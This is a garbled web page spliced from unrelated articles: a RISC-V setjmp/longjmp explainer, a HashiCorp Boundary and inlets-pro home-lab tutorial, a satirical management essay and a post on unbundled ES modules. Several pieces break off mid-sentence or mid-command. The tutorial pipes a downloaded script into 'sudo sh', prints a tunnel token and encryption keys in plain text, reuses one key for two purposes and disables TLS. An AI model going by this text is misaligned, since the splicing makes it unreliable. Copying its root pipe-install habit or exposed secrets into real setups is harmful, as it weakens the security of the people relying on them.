<p>Jumps are one of the fundamental components of control flow in programming. Nearly any <em>Instruction Set Architecture</em> (ISA) is going to have a jump instruction that lets you modify the program counter to execute the next instruction from the specified location in memory. We also see control flow statements in higher level languages that provide similar logic. An example of this would be the <code>goto</code> statement in C. Using <code>goto</code> is frowned upon by many C programmers due to the ability to create horribly complex code, but it does have useful applications, such as centralized executing of functions, as described in the <a href="https://www.kernel.org/doc/Documentation/process/coding-style.rst">Linux kernel coding style guide</a>. It allows you to define a label, then “go to” that place in your program and resume execution from there. For example, the following program will print <code>Here</code> followed by a newline character over and over again.</p>
<p><code>goto.c</code></p>
<div><pre><code data-lang="c">
<span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span></span>
<span>int</span> main()
{
jumptome:
    printf(<span>"Here</span><span>\n</span><span>"</span>);
    <span>goto</span> jumptome;
}

</code></pre></div><p>Let’s take a look at the generated assembly for <code>main()</code> using <code>objdump</code>:</p>
<div><pre><code data-lang="fallback">
0000000000010158 &lt;main&gt;:
   10158:    1141                    addi   sp,sp,-16
   1015a:    e406                    sd     ra,8(sp)
   1015c:    e022                    sd     s0,0(sp)
   1015e:    0800                    addi   s0,sp,16
   10160:    67c9                    lui    a5,0x12
   10162:    6c078513                addi   a0,a5,1728 # 126c0 &lt;__errno+0xe&gt;
   10166:    1fc000ef                jal    ra,10362 &lt;puts&gt;
   1016a:    bfdd                    j      10160 &lt;main+0x8&gt;

</code></pre></div><p>As you can see, using <code>goto</code> in the program translates directly to the <code>j</code> RISC-V instruction, which jumps to memory address 10160, causing the processor to continuously execute our <code>printf</code> statement. It would be much more clear for us to use a <code>while</code> statement here, but we will actually get the exact same assembly output with an infinite loop:</p>
<p><code>while.c</code></p>
<div><pre><code data-lang="c">
<span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span></span>
<span>int</span> main()
{
    <span>while</span> (<span>1</span>)
    {
        printf(<span>"Here</span><span>\n</span><span>"</span>);
    }
}

</code></pre></div><div><pre><code data-lang="fallback">
0000000000010158 &lt;main&gt;:
   10158:    1141                    addi    sp,sp,-16
   1015a:    e406                    sd      ra,8(sp)
   1015c:    e022                    sd      s0,0(sp)
   1015e:    0800                    addi    s0,sp,16
   10160:    67c9                    lui     a5,0x12
   10162:    6c078513                addi    a0,a5,1728 # 126c0 &lt;__errno+0xe&gt;
   10166:    1fc000ef                jal     ra,10362 &lt;puts&gt;
   1016a:    bfdd                    j       10160 &lt;main+0x8&gt;

</code></pre></div><p>However, <code>goto</code> can provide more functionality than a loop, and is specifically useful for breaking out of a set of deeply nested loops. The aforementioned Linux kernel style guide gives the following example for an appropriate use of <code>goto</code>:</p>
<div><pre><code data-lang="c">
<span>int</span> fun(<span>int</span> a)
{
    <span>int</span> result = <span>0</span>;
    <span>char</span> *buffer;

    buffer = kmalloc(SIZE, GFP_KERNEL);
    <span>if</span> (!buffer)
        <span>return</span> -ENOMEM;

    <span>if</span> (condition1) {
        <span>while</span> (loop1) {
            ...
        }
        result = <span>1</span>;
        <span>goto</span> out_free_buffer;
    }
    ...
out_free_buffer:
    kfree(buffer);
    <span>return</span> result;
}

</code></pre></div><p>In this case, a descriptive label is being used to define a specific error path. Though only a small part of the function body is included here, you can imagine that there could be multiple stages in which the allocated buffer could become full, all of which you would handle by freeing the memory and returning the result. While some may still advocate for never using <code>goto</code>, this demonstrates that there are some benefits, such has not needing to duplicate redundant code throughout the function body.</p>
<h2 id="non-local-jumps">Non-Local Jumps</h2>
<p>Unfortunately (or fortunately if you are a strong proponent of never using <code>goto</code>), it only is valid in a local context. You cannot jump to a label outside of the function in which you are currently executing. For this reason, <code>setjmp</code> and <code>longjmp</code> were added to the C standard library to support non-local jumps. Let’s take a look at a minimal example of using these functions.</p>
<p><code>minimal.c</code></p>
<div><pre><code data-lang="c">
<span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;setjmp.h&gt;</span><span>
</span><span></span>
<span>static</span> jmp_buf buf;

<span>void</span> b()
{
    printf(<span>"in function b</span><span>\n</span><span>"</span>);
    longjmp(buf, <span>1</span>);
}

<span>void</span> a()
{
    printf(<span>"in function a</span><span>\n</span><span>"</span>);
    <span>if</span> (setjmp(buf))
        printf(<span>"back in function a</span><span>\n</span><span>"</span>);
    <span>else</span>
        b();
}

<span>int</span> main()
{
    a();
}

</code></pre></div><div><pre><code data-lang="fallback">
in function a
in function b
back in function a

</code></pre></div><p>We can get a good understanding of what is going on here by taking a look at the <a href="https://www.man7.org/linux/man-pages/man3/setjmp.3.html">setjmp Linux manual page</a>. Specifically for this program, the following portions of the description are important:</p>
<blockquote>
<p>In this case, setjmp() returns 0.</p>
</blockquote>
<blockquote>
<p>The longjmp() function uses the information saved in env to transfer control back to the point where setjmp() was called and to restore (“rewind”) the stack to its state at the time of the setjmp() call.</p>
</blockquote>
<blockquote>
<p>Following a successful longjmp(), execution continues as if setjmp() had returned for a second time.</p>
</blockquote>
<p>In the simplest of terms, these two functions allow us to save an address and return to it at a later point in execution. Behind the scenes, other values are also being saved into the <code>buf</code>, which we will look at momentarily. First, let’s see what the actual assembly output for a 64-bit RISC-V target looks like.</p>

</code></pre></div><p>Here is the implementation of <code>setjmp</code> in RISC-V assembly. Before diving too far in, it is important to understand the registers in the RISC-V architecture. Since we are using a 64-bit machine, each of the 32 general purpose registers is 64 bits wide. Though each of the registers is classified as general purpose, there are calling conventions that most compilers will adhere to.</p>

<p>In addition to the registers, we must understand the few pseudo instructions that <code>setjmp</code> makes use of.</p>
<ul>
<li><code>sd</code>: store doubleword (stores the value in the register specified by the first operand into the address specified by the second)</li>
<li><code>fsd</code>: the floating point counterpart to <code>sd</code></li>
<li><code>li</code>: load immediate (loads the second operand directly into the register specified by the first)</li>
</ul>
<p><em>If you are interested in checking out all of the instructions available when writing RISC-V assembly, take a look at the <a href="https://github.com/riscv/riscv-asm-manual/blob/master/riscv-asm.md">programmer’s manual</a>.</em></p>
<p>So what exactly are we doing here? The behavior of <code>setjmp</code> is specified as storing information about the calling function’s environment into the buffer. If you look back to the source code of <code>minimal.c</code>, you’ll see that we are passing the buffer of type <code>jmp_buf</code> into the <code>setjmp</code> function in <code>a()</code>. If we look at the dump of <code>a()</code> you can see that we are jumping and linking (<code>jal</code>) to the address of the <code>setjmp</code> function:</p>

<p>A few weeks ago, I had the pleasure to join Hashicorp’s second fully virtual conference, <a href="https://hashiconf.com/" target="_blank">HashiConf Digital</a> 2020. Leading to this online conference, they were teasing all of us with the announcement of two new Open Source products. Spread over two keynotes, Armon and Mitchell gave an introduction to those highly kept secret products, <a href="https://www.boundaryproject.io/" target="_blank"><strong>Boundary</strong></a> and <a href="https://www.waypointproject.io/" target="_blank"><strong>Waypoint</strong></a>.</p>

<p>I haven’t looked at Waypoint in detail yet, but here I want to talk specifically about Boundary and what it is. And of course, if you read my previous posts, I couldn’t resist to see if this new project can be of any use in my private Raspberry Pi home lab.</p>

<h2 id="what-is-hashicorp-boundary">What is HashiCorp Boundary?</h2>

<p><strong>Boundary</strong> is a new open source project that enables clients to securely access dynamic hosts and services with fine-grained authorization without requiring direct access to your private network. With Boundary, a user first needs to authenticate using a trusted Identity Provider. Boundary then uses policies and RBAC to define what services authenticated clients can access on a particular network based on their identity.</p>

<p>It is a modern and a more dynamic approach to give secure access to your resources compared to more traditional approaches like SSH bastion hosts or VPNs</p>

<p>In a traditional approach, on-boarding and giving operators access to the machines would typically involve some things to do. For starters, maybe a new VPN profile or a new SSH key needs to be created, which can become hard to manage at scale when more and more people need to be on-boarded. The second subject to consider is to put the required firewall rules in place that allow the operators to only access to appropriate hosts. Such firewalls mostly assume resources are more static, and it is not well suited for the cloud with highly ephemeral and dynamic environments.</p>

<p>Boundary was designed with these core problems in mind: grant access to critical systems with least privilege.</p>

</figure>


<p>As you might know from my previous post, I’m running some Raspberry Pi clusters in my home lab. To get SSH access from anywhere to those little compute units in my private network, I could set up a VPN, but instead I’m a profound user of <a href="https://inlets.dev/" target="_blank"><strong>inlets-pro</strong></a>, a Cloud Native Tunnel for L4 TCP traffic. Using inlets, you can give any Raspberry Pi a public IP address by creating an exit-node on a public cloud provider of your choice. Giving SSH access to a private node with inlets-pro is a common scenario and is explained in detail in <a href="https://docs.inlets.dev/#/get-started/quickstart-tcp-ssh" target="_blank">this tutorial</a> by Alex Ellis</p>

<p>This is not the only use case of inlets; it is, in fact, a powerful tool and can be used for multiple purposes (taken from the <a href="https://docs.inlets.dev/#/?id=use-cases" target="_blank">documentation</a>):</p>

<p><strong><em>For companies - hybrid cloud, multi-cluster and partner access</em></strong></p>

<ul>
<li><em>Low-maintenance, secure, and quick alternative to a VPN</em><br></li>
<li><em>To build a hybrid cloud between existing servers and public cloud for</em><br></li>
<li><em>To migrate on-premises databases and APIs to public cloud</em><br></li>
<li><em>To connect to the private environments of your customers in a SaaS product</em></li>
</ul>

<p><strong><em>For teams and individuals - for public tunnels and Kubernetes connectivity</em></strong></p>

<ul>
<li><em>As a zero-touch VPN - penetrating NAT, firewalls, captive portals and hotel WiFi</em><br></li>
<li><em>When integrating with API that uses webhooks such as Stripe, PayPal or GitHub, you can test live with your local machine</em><br></li>
<li><em>To access your home lab, Owncloud instance, FreeNAS, or Raspberry Pi cluster using SSH and HTTPS</em><br></li>
<li><em>As an alternative to SaaS and or proprietary offerings such as Ngrok and Argo Tunnel where you can use your own DNS, and decide your own rate-limits</em></li>
</ul>

<h2 id="secure-access-with-boundary-inlets-pro">Secure access with Boundary + inlets-pro</h2>

<p>While I can use inlets-pro to give myself access to my private nodes from anywhere, I still have to distribute SSH keys when I want to give a friend or colleague temporary access. Also, because my clusters have many unit, all of them need to be exposed with inlets-pro, or the secure tunnel needs to be created on request, if you want to connect to them. This can become quite a challenge to manage and maintain. This is exactly what Boundary tries to solve. It provides a secure way to access hosts and critical systems without having to manage credentials or expose your network</p>

<p>So I was wondering what it would take to use HashiCorp Boundary, in combination with inlets-pro, to give friends and colleagues access to my SBCs.</p>

<p>The idea here is to install Boundary on a single node of my clusters, and expose this service via an exit-node with inlets-pro.</p>

<h2 id="tutorial">Tutorial</h2>

<p>For this setup, I took a cluster of four Raspberry Pis, running Ubuntu 20.04, all with a proper hostname and a static IP address.</p>

<ul>
<li>orion-rpi4-01 (192.168.0.51)<br></li>
<li>orion-rpi4-02 (192.168.0.52)<br></li>
<li>orion-rpi4-03 (192.168.0.53)<br></li>
<li>orion-rpi4-04 (192.168.0.54)</li>
</ul>

<p>All of them have the SSH server enabled, and for the time being, only one user with name <code>ubuntu</code> is created. One the first one, we are going to install all the components of Boundary:</p>

<p>Here’s the workflow for the tutorial:</p>

<ul>
<li>Install <code>inlets-pro</code> and <code>inletsctl</code><br></li>
<li>Create a tunnel and an exit-sever with a public IP<br></li>
<li>Install Postgres<br></li>
<li>Install Boundary<br></li>
<li>Configure and start a Boundary Controller service<br></li>
<li>Configure and start a Boundary Worker service</li>
</ul>

<h3 id="get-a-public-ip">Get a public IP</h3>

<p>First, let’s give our Raspberry Pi a public IP address.</p>

<p>Grap yourself a inlets-pro license, download inletsctl and use it to get the inlets-pro client:</p>
<div><pre><code data-lang="bash">curl -sSLf https://inletsctl.inlets.dev | sudo sh
sudo inletsctl download --pro</code></pre></div>
<p>Now create an exit-node for your favourite cloud. I’m going to use DigitalOcean, which happens to be the fastest and cheapest.</p>
<div><pre><code data-lang="bash">inletsctl create  <span>\
</span><span></span>  --provider digitalocean <span>\
</span><span></span>  --access-token-file ~/do-access-token <span>\
</span><span></span>  --pro</code></pre></div>
<p>When the program completes running, you’ll be presented with a command you can run to connect to the tunnel and start proxying traffic. Have a close look at this output, because it has the required auth token and the remote URL you will later to create the client-side of the tunnel.</p>

<p>In my case, the public IP address was <code>178.62.111.14</code> and the token <code>kHPqUgb80hE90DkzWiNWtB0BUr2AbUGPBPDw9ozUqAdTjIfdj0R41iLjffbzObgC</code>. During the tutorial, those values are used in several scripts and configuration files, so if you are following along, replace them with your correct values.</p>

<p>Next, on the Raspberry Pi, create the systemd service for the inlets-pro client and start the client part of the tunnel.</p>
<div><pre><code data-lang="bash">export LICENSE<span>=</span><span>""</span>
inlets-pro client --generate<span>=</span>systemd <span>\
</span><span></span>  --url <span>"wss://178.62.111.14:8123/connect"</span> <span>\
</span><span></span>  --token <span>"kHPqUgb80hE90DkzWiNWtB0BUr2AbUGPBPDw9ozUqAdTjIfdj0R41iLjffbzObgC"</span> <span>\
</span><span></span>  --license <span>"</span>$LICENSE<span>"</span> <span>\
</span><span></span>  --port <span>9200</span> <span>\
</span><span></span>  --port <span>9202</span> <span>\
</span><span></span>  --upstream <span>"127.0.0.1"</span> | sudo tee -a /etc/systemd/system/inlets.service

sudo systemctl enable inlets
sudo systemctl start inlets</code></pre></div>
<p>Neat, at this moment, all TCP traffic on port 9200 and 9202 of the public VM is tunnelled towards the Raspberry Pi, although nothing is serving something on those ports yet.</p>

<h3 id="install-postgres-create-the-database-and-a-user">Install Postgres, create the database and a user</h3>

<p>Because I’m running Ubuntu 20.04, the easiest way to install Postgres is using <code>apt</code></p>
<div><pre><code data-lang="bash">sudo apt update
sudo apt install postgresql</code></pre></div>
<p>When installed, connect to Postgres and create a database and a user for Boundary:</p>
<div><pre><code data-lang="bash">sudo -u postgres createuser -s -w boundary
sudo -u postgres psql -c <span>"ALTER ROLE boundary WITH PASSWORD '&lt;your preferred password&gt;';"</span>
sudo -u postgres psql -c <span>"CREATE DATABASE boundary;"</span>
sudo -u postgres psql -c <span>"GRANT ALL PRIVILEGES ON DATABASE boundary TO boundary;"</span></code></pre></div>
<h3 id="download-boundary">Download Boundary</h3>

<p>Download the Boundary binary and install it in the correct place:</p>
<div><pre><code data-lang="bash">curl -o <span>"boundary.zip"</span> -sfL <span>"https://releases.hashicorp.com/boundary/0.1.1/boundary_0.1.1_linux_arm64.zip"</span>
sudo unzip -qq -o <span>"boundary.zip"</span> -d /usr/local/bin</code></pre></div>
<p>and verify the installation:</p>
<div><pre><code data-lang="bash">$ boundary version

Version information:
  Git Revision:        eccd68d73c3edf14863ecfd31f9023063b809d5a
  Version Number:      <span>0</span>.1.1

$ </code></pre></div>
<p>Great! All set and ready to go.</p>

<h3 id="install-boundary-controller-and-worker">Install Boundary Controller and Worker</h3>

<h4 id="configuration">Configuration</h4>

<p>Before starting a Boundary controller and worker, we have to create the proper configuration files and initialize the database. Create the two files:</p>

<ul>
<li>/etc/boundary/controller.hcl</li>
</ul>
<div><pre><code data-lang="hcl">disable_mlock = true

controller {
  name = "orion-rpi4-01"

  database {
      url = "postgresql://boundary:&lt;your preferred password&gt;@localhost/boundary"
  }
}

listener "tcp" {
  address = "127.0.0.1"
  purpose = "api"
  tls_disable = true
}

listener "tcp" {
  address = "127.0.0.1"
  purpose = "cluster"
  tls_disable = false
}

kms "aead" {
  purpose = "root"
  aead_type = "aes-gcm"
  key = "sP1fnF5Xz85RrXyELHFeZg9Ad2qt4Z4bgNHVGtD6ung="
  key_id = "global_root"
}

kms "aead" {
  purpose = "worker-auth"
  aead_type = "aes-gcm"
  key = "8fZBjCUfN0TzjEGLQldGY4+iE9AkOvCfjh7+p0GtRBQ="
  key_id = "global_worker-auth"
}

kms "aead" {
  purpose = "recovery"
  aead_type = "aes-gcm"
  key = "8fZBjCUfN0TzjEGLQldGY4+iE9AkOvCfjh7+p0GtRBQ="
  key_id = "global_recovery"
}</code></pre></div>
<ul>
<li>/etc/boundary/worker.hcl</li>
</ul>
<div><pre><code data-lang="hcl">listener "tcp" {
    purpose = "proxy"
    tls_disable = false
}

worker {
  name = "orion-rpi4-01"

  controllers = [
    "127.0.0.1"
  ]

  public_addr = "178.62.111.14"
}

# must be same key as used on controller config
kms "aead" {
    purpose = "worker-auth"
    aead_type = "aes-gcm"
    key = "8fZBjCUfN0TzjEGLQldGY4+iE9AkOvCfjh7+p0GtRBQ="
    key_id = "global_worker-auth"
}</code></pre></div>
<p>Some parts of the configuration need a little bit of explanation:</p>

<ul>
<li>all the listeners are bind to 127.0.0.1, keeping everything private. Both the controller API and the worker are exposed via the inlets-pro tunnel.<br></li>
<li>For simplicity of this tutorial, TLS is disabled for the API. This is of course, not the recommended approach, so <strong>do enable this for production</strong>.<br></li>
<li>the public address of the worker is set to the public IP address of the exit-node</li>
</ul>

<h4 id="initialize-the-database">Initialize the database</h4>

<p>With those two files in place, now it is time to initialize the database:</p>
<div><pre><code data-lang="bash">sudo boundary database init -config …</code></pre></div></div></div>

Unbeknownst to you, Genghis, the company CEO, just had dinner with other industry leaders and became excited about this new thing called Beezlyboo. Genghis mentions his excitement at Thursday’s executive council meeting, with the company’s top layer of middle management listening in.</p><p>Mandukhai, the middle manager two layers above you, was present. She conveys the takeaways in her regular Friday morning coffee catchup with the managers that report to her, including the Foobar team lead, your boss, Subotai.</p><p>Fighting for relevance after a bumpy year, Subotai grows convinced that working on this Beezlyboo thing might be his ticket back into Mandukhai's good graces.</p><p>You enter the office on Monday morning, unsheathe your sword, and balance it carefully on top of your monitor before sitting down and getting to work. <i>Little do you know that two weeks from now, half your time will be spent on this new thing called Beezlyboo.</i></p><div><h3>How Middle Management Emerges</h3><p>This is an unfortunately common description of how decisions are made in many of today’s <del>Khanates</del> companies. Why is that? Let’s take a look at how communication and decision making evolve as companies grow larger.</p><p>Here’s how many companies begin: <br><img src="https://middle-out.io/images/genghis/2company.png" alt="2 people companies"></p><p>Two founders, working closely to get their new startup off the ground.</p><p>A more mature company might look more like this:<br><img src="https://middle-out.io/images/genghis/k3company.png" alt="Small company"></p><p>That’s Google circa 1999. Individuals hold increasingly defined roles. Management and process are beginning to creep in, but all anyone really wants to do is get on with things, management be damned. Grabbing a colleague to discuss something is as easy as shouting across the office.</p><p>But as companies grow larger, the majority end up looking more like this:<img src="https://middle-out.io/images/genghis/3comp.png" alt="Large company"></p><p>This is of course an over-simplification as every organization maintains informal networks, cross-functional teams, and parallel networks. But it is a useful representation to understand how hierarchies simplify the sharing of information by creating highways for it. Additionally, we will assume that every team operates in a mesh (even if we were not skilled enough to draw those relations).</p><p>See those ‘o’ nodes? That’s middle management. Layers and layers of it. Its main purpose is to simplify decision making and communication by concentrating ownership of different parts of the business in the hands of a select few.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><p>For the more mathematically inclined, middle management splits the previously shown complete graphs with <span><span><span><math><semantics><mrow><msub><mi>K</mi><mi>n</mi></msub><mo>=</mo><mfrac><mrow><mi>n</mi><mo>(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo>)</mo></mrow><mrow><mn>2</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">K_n = \frac{n(n-1)}{2}</annotation></semantics></math></span></span></span> edges into multiple complete subgraphs with <span><span><span><math><semantics><mrow><msub><mi>M</mi><mi>n</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mi>i</mi><mi>n</mi></msubsup><msub><mi>K</mi><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">M_n = \sum_i^nK_{m(i)+1}</annotation></semantics></math></span></span></span> edges, where <span><span><span><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span></span></span> runs over managers and <span><span><span><math><semantics><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">m(i)</annotation></semantics></math></span></span></span> is the number of people they manage.

When CEO Genghis or Kublai, another middle manager, want to figure out what’s going on with the Foobar team (highlighted above in Millenial pink), all they need do is call Subotai. By concentrating ownership of Foobar in Subotai’s hands, his team is shielded from unnecessary communication, allowing them to focus on their work.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><p>To illustrate: <span><span><span><math><semantics><mrow><msub><mi>K</mi><mrow><mn>5</mn><mn>0</mn><mn>0</mn><mn>0</mn></mrow></msub><mo>=</mo><mn>1</mn><mn>2</mn><mo separator="true">,</mo><mn>4</mn><mn>9</mn><mn>7</mn><mo separator="true">,</mo><mn>5</mn><mn>0</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">K_{5000} = 12,497,500</annotation></semantics></math></span></span></span>, but introducing 556 managers<a href="#2po"><sup id="2pr">2</sup></a> each with <span><span><span><math><semantics><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo><mo>=</mo><mn>1</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">m(i) = 10</annotation></semantics></math></span></span></span> reports gives <span><span><span><math><semantics><mrow><msub><mi>M</mi><mrow><mn>5</mn><mn>5</mn><mn>6</mn></mrow></msub><mo>=</mo><mn>3</mn><mn>0</mn><mo separator="true">,</mo><mn>5</mn><mn>8</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">M_{556} = 30,580</annotation></semantics></math></span></span></span>.

While the ‘x’ nodes focus on the work at hand, the ‘o’ nodes are busy talking and aligning amongst themselves. This creates two problems: the ‘o’s lose touch with the actual work being done, while the ‘x’s cannot easily see, communicate, or influence beyond team boundaries. Which, remember, is why you’ll be surprised when Beezlyboo lands on your desk in two weeks' time.</p><h3>What Companies Are Doing About This Today</h3><p>So far we've been talking about idealized companies. In reality, there are informal networks that permeate company hierarchies. There are also good and bad ‘x’s and ‘o’s. We know a lot about what a good ‘o’ is (or should be). There’s an <a href="https://www.forbes.com/sites/vickyvalet/2019/03/19/americas-best-management-consulting-firms-2019/#656906003d00">entire industry out there dedicated to this</a>, complete with degrees (MBAs) and reading material (those management books you tend to find in airport bookshops).</p><p>One thing ‘o’s obsess over is how best to organize things, which is great. That's their job, after all. The problem is that their solutions are often clunky. Do any of these sound familiar?</p><ul><li><b>Culture stuff:</b> the ‘o’s realize the company’s formal and informal hierarchies are too strong, so they begin promoting things like guilds, societies, team building activities, random coffee catchups between senior leads and juniors, etc.</li><li><b>Reorgs:</b> featuring endless tweaks to the traditional hierarchical org structure (functional, divisional, matrix/cross-functional… you name it). Ironically, it’s the ‘o’s that instigate these —  often to the complete bewilderment of the ‘x’s.</li><li><b>Surveys:</b> because making the ‘x’s click through an annoying ten-page annual survey is a great way of discovering how they really feel. Right? Right. </li></ul><p>If these solutions sound drab and disengaging, it's because they are. <a href="https://en.wikipedia.org/wiki/Ronald_Coase">Ronald Coase</a>, the 1991 Nobel laureate in economics, published an <a href="https://onlinelibrary.wiley.com/doi/full/10.1111/j.1468-0335.1937.tb00002.x">influential essay in 1937</a> on why firms even appear, and mentions that the benefits of larger firms are quickly outweighed by the overheads of maintaining their complex hierarchies and the misallocations of resources which stem from this. In a more modern work, Gary Hammel and Michele Zanini demonstrate in <a href="https://www.humanocracy.com/">Humanocracy</a> -- another one of those airport books -- that:                </p><p>A <a href="https://www.gallup.com/workplace/236552/managers-engaged-jobs.aspx">2018 Gallup study</a> found two-thirds of US employees and 51 percent of US managers to be disengaged at work.</p><p>In 2018, there were 146 million employees in the US workforce. [...] Of these, 20.5 million were managers and supervisors. In addition, there were 6.4 million employed in administrative support functions. In total, then, the bureaucratic class comprises 26.9 million individuals or 18.4 percent of the US workforce. [...] claiming more than $3.2 trillion in compensation, or nearly a third of America’s total wage bill.</p><p>They argue that, if we could repurpose a fraction of this managerial bloat into more productive pursuits, we would free up a lot of unproductive excess wages and therefore raise productivity, overall compensation (for the rest of us), and employee engagement.</p><p><b>Genghis:</b> Okay, kiddo, that's great... but we're trying to run a Khanate company that stretches from eastern Europe to China. Maybe our team building activities are a little boring, and we do like a good reorg, especially after we invade acquire a new company, but what are you proposing? That we fire all our generals and officers and turn into those Valve hippies? <br><b>Ogedei (You):</b> Not at all. Hear me out.</p><h3>What the Future Might Look Like</h3><p>With everyone and <a href="https://www.itv.com/news/wales/2020-03-19/people-stuck-at-home-are-sharing-pictures-of-their-cat-and-dog-coworkers">their cat</a> — not to mention the <a href="https://www.oecd.org/future-of-work/">OECD</a> — talking about the Future of Work these days, isn’t it time we began trying to tackle company organization with more pizazz? You know, just throw some tech and AI at it.</p><p><b>Genghis:</b> Oh god, here we go again with your AI thing.<br></p><p>He's right: here we go.<a href="#3po"><sup id="3pr">3</sup></a> One of the most significant transformations due to play out over the next decade is the <a href="https://www.cnbc.com/2019/06/20/slack-ceo-predicts-end-of-company-email-as-we-know-it-in-7-years.html">death of email</a> in within-company communications and its replacement by tools like Slack and Teams. Not only do Slack and Teams introduce a new medium for companies to communicate in, they also allow for modern third-party integrations via their APIs. That’s something email tools like Gmail or Outlook never quite got right.</p><p>On top of this, there's an unfolding generational shift. Millennials will continue to graduate to positions of power as the 2020s progress — and they’ve grown up using online chat protocols and social networks.</p><p><b>Ogedei:</b> So here’s the thing, Dad.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p>For the last year, I’ve been running a single-page web app powered by ES modules in production.</p>
<p>It’s a JavaScript app but it doesn’t use Babel, Webpack, Rollup, or any other tooling for transpiling or bundling. The files I write in development are the same files that get served to end-users in production.</p>
<p>The app is for a side-project… an <a href="https://musicboxfun.com/">online music-box song making tool</a>. It’s not a massive app, but it’s not tiny either—there’s currently about 60 JavaScript modules, which are a mix of components, utilities, and third-party libraries. <a href="https://github.com/bryanbraun/music-box-fun/tree/master/site">The codebase</a> looks a lot like a ReactJS project, but it doesn’t use React. It uses a plain JavaScript alternative that substitutes abstractions (like JSX) with native JavaScript features (like template strings). The framework isn’t relevant for the purpose of this post but you can read more about it in <a href="https://www.bryanbraun.com/2019/09/11/web-dev-nirvana-and-why-I-needed-to-let-go-of-reactjs-to-reach-it/">my earlier post</a>, if you are curious.</p>
<p>When I launched the app in August 2019, the industry consensus was that using unbundled ES6 modules in production was a bad idea. Khan Academy tried unbundling their homepage JS and concluded that <a href="https://blog.khanacademy.org/forgo-js-packaging-not-so-fast/">it slowed down their initial page load</a>. That was five years ago and I still don’t know of anybody who seriously considers skipping the bundler and using ES6 modules in production.*</p>
<p>And that’s too bad because now that <a href="https://caniuse.com/es6-module">browser support for ES modules is great</a>, it seems like we could avoid a lot of <a href="https://www.bryanbraun.com/2019/04/16/nonsense/">nonsense</a> by just <a href="https://twitter.com/BryanEBraun/status/1295171120459546624">writing JavaScript that the browser understands</a> (at least for projects where it makes sense).</p>
<p>I kept looking for examples of people doing this but I struggled to find them, so I decided I’d give it a try and see how bad it really was. Here’s what I found:</p>
<h2 id="things-that-met-expectations">Things that met expectations</h2>
<p><strong>Development experience.</strong> I expected the development experience to be great, and it was. There’s no setup instructions, no startup delays. No need to watch files, generate source maps, or wait for things to recompile. Just save the file and refresh. ✨</p>
<p><strong>Deployment.</strong> Deployment was straightforward. All I needed to do was copy my code to the server as-is. My web host Netlify makes it easy to do this on git push (though, to be fair, Netlify can make even the most complex setups easy to deploy).</p>
<p><strong>Dev/Prod parity.</strong> Every time I found a production bug I was able to reproduce it locally. Not a major goal, but very convenient.</p>
<h2 id="things-that-were-worse-than-expected">Things that were worse than expected</h2>
<p><strong>Dependencies not supporting ES modules.</strong>
I often found libraries I wanted to use, only to learn that they didn’t support ES modules. They usually supported CommonJS instead, which meant I couldn’t use them. At first, I was working around this by loading versions of the library that use browser globals (either via script tag, or <a href="https://stackoverflow.com/q/41127479/1154642">side-effects import</a>). This worked, but it didn’t feel ideal.</p>
<p>Eventually, I started using <a href="https://www.snowpack.dev/">Snowpack</a>, which can import dependencies that don’t support ES modules and produce a one-time build that does. This worked so well that <a href="https://github.com/sparkbox/bouncy-ball/pull/104">I’ve started using it on other projects</a>.</p>
<p><strong>Environment variables.</strong> Typically, I’d assign these at build-time but you can’t when there’s no build. Fortunately, Cory House has <a href="https://www.freecodecamp.org/news/environment-settings-in-javascript-apps-c5f9744282b6/">a great post describing all the options</a>. I ended up using <a href="https://www.freecodecamp.org/news/environment-settings-in-javascript-apps-c5f9744282b6/#option-6-environment-sniffing">environment sniffing</a> which feels a little weird, but ultimately isn’t a big deal for my app.</p>
<p><strong>CSS organization.</strong> I went with traditional CSS using BEM conventions, which was fine. I still wanted to break up my files though, so I used a <code>main.css</code> file with a bunch of <code>@imports</code>. That felt better, but then I had a blocking request that delayed page rendering so <a href="https://github.com/bryanbraun/music-box-fun/commit/dc2cc62c58ae61d972c124a433ca00d9aac304a2">I moved the <code>@imports</code> into an inline style tag</a>. I’m not sure if I like it, so I may keep iterating on this.</p>
<h2 id="things-that-were-better-than-expected">Things that were better than expected</h2>
<p><strong>Cache invalidation.</strong> I was worried that I was going to have trouble invalidating cached CSS or JavaScript (since I couldn’t rely on a bundler to give my assets cache-busting filenames). It turns out that <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag">ETags</a> are a great solution for this (especially since <a href="https://www.netlify.com/blog/2017/02/23/better-living-through-caching/">my web host has a solid implementation that’s quick and simple</a>). I’ve heard that cache-busting filenames can be a bit faster than Etags, but Netlify’s implementation feels pretty snappy to me.</p>
<p><strong>Performance.</strong>
Everything I heard said that ES module performance was going to be terrible, even with HTTP/2. So I braced myself and… it’s been great. I haven’t even done any optimizations beyond making sure that my initial HTML file had some good default markup. I suspect the performance is good because my app isn’t big enough to start hitting any bottlenecks yet (<a href="https://v8.dev/features/modules#performance">this research</a> says you’ll be fine if you’re below a couple hundred modules, which <a href="https://twitter.com/lukejacksonn/status/1318158374878457857">seems to be confirmed anecdotally</a>). This made me realize that that my intuition was off on what was “too big” of an app. You can go a long way before you’re in a place where you need to load 300-500 files, all at once. It feels unlikely that I’ll reach those limits on my app, at least.</p>
<p>I was a little worried about not minifying my JavaScript. Isn’t that a huge number of bytes saved? It turns out that the difference is a lot smaller when your files are served gzipped (or <a href="https://www.netlify.com/blog/2020/05/20/gain-instant-performance-boosts-as-brotli-comes-to-netlify-edge/">brotli-compressed, as in my case</a>). Minifying would still make my files smaller by renaming variables and stripping out comments, but the difference was less than I expected.</p>
